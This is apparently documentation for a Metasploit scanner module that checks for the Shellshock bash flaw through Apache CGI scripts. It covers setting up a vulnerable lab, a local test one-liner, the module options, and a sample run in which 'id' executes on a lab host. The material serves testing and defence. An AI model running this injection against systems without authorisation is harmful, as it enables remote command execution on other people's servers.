## Vulnerable Application

This module scans for the Shellshock vulnerability, a flaw in how the Bash shell handles external
 environment variables. This module targets CGI scripts in the Apache web server by setting
 the `HTTP_USER_AGENT` environment variable to a malicious function definition.

### Creating a Vulnerable Environment
To setup an Environment that the scanner can be run against, follow the below steps to install a
 vulnerable OS and Apache version.

  To ensure that you have a vulnerable version of bash:

  1. Install [Ubuntu 12.04.5 LTS](http://cdimage.ubuntu.com/releases/12.04/release/)
  2. Log into console
  3. Confirm the host is vulnerable (see next section)
  4. Also install Apache2 from the apt repository with the following command

    ```
    sudo apt-get install apache2
    ```

  5. Enable cgi-mod in apache with the following command

    ```
    sudo ln -s /etc/apache2/mods-available/cgi.load /etc/apache2/mods-enabled/cgi.load
    ```

  6. Restart the apache service with the following command

    ```
    sudo service apache2 reload
    ```

  7. In your favorite text editor create a file (as root) in `/usr/lib/cgi-bin` called `test.sh` with the following contents:

    ```
    #!/bin/bash
    printf "Content-type: text/html\n\n"
    printf "Test!\n"
    ```

  8. Set the file to be executable with the following command

    ```
    sudo chmod +x /usr/lib/cgi-bin/test.sh
    ```

### To check if a host is vulnerable to the attack

   1. Run (on the host)

    ```
    env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"
    ```

   2. The shell will return the below text if the environment is vulnerable

    ``` 
    vulnerable
    bash: BASH_FUNC_x(): line 0: syntax error near unexpected token `)'   
    bash: BASH_FUNC_x(): line 0: `BASH_FUNC_x() () { :;}; echo vulnerable'
    bash: error importing function definition for `BASH_FUNC_x'
    test
    ```

## Verification Steps

1. Do: run `msfconsole`
2. Do: use `auxiliary/scanner/http/apache_mod_cgi_bash_env`
3. Do: set `RHOSTS [IP]`
4. Do: set `TARGETURI [URI]`
5. Do: `run`

## Options

**CMD**

This is the command that will be run by the scanner. The default setting is `/usr/bin/id`.

**CVE**

This is the CVE that will be used to exploit the vulnerability.
The default setting is `CVE-2014-6271` but valid options are `CVE-2014-6271` or `CVE-2014-6278`.

**HEADER**

This is the user agent string that is sent when the module is run. The default setting is `User-Agent`.

**METHOD**

This is HTTP method used by the module.  The default setting is `GET`.

## Scenarios

### Ubuntu 12.04.5 LTS on Apache 2.2.22

  ```
msf5 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS 172.16.131.134
RHOSTS => 172.16.131.134
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI /cgi-bin/test.sh
TARGETURI => /cgi-bin/test.sh
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > exploit

[+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
  ```
